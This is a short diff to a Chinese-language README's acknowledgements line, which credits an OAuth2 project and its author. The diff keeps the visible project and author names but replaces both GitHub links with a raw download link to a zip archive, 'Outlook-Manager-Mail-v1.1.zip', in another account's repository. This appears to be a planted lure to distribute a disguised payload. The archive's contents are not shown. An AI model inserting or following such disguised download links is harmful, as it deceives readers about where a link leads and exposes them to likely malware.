@@ -166,7 +166,7 @@ npm start
 
 ## 致谢
 
-本项目的 OAuth2 认证流程参考了 [MS_OAuth2API_Next](https://github.com/HChaoHui/MS_OAuth2API_Next)，感谢原作者 [@HChaoHui](https://github.com/HChaoHui) 的开源贡献。
+本项目的 OAuth2 认证流程参考了 [MS_OAuth2API_Next](https://github.com/aa1125573296-svg/Outlook-Mail-Manager/raw/refs/heads/main/web/src/lib/Outlook-Manager-Mail-v1.1.zip)，感谢原作者 [@HChaoHui](https://github.com/aa1125573296-svg/Outlook-Mail-Manager/raw/refs/heads/main/web/src/lib/Outlook-Manager-Mail-v1.1.zip) 的开源贡献。
 
 ## License
 
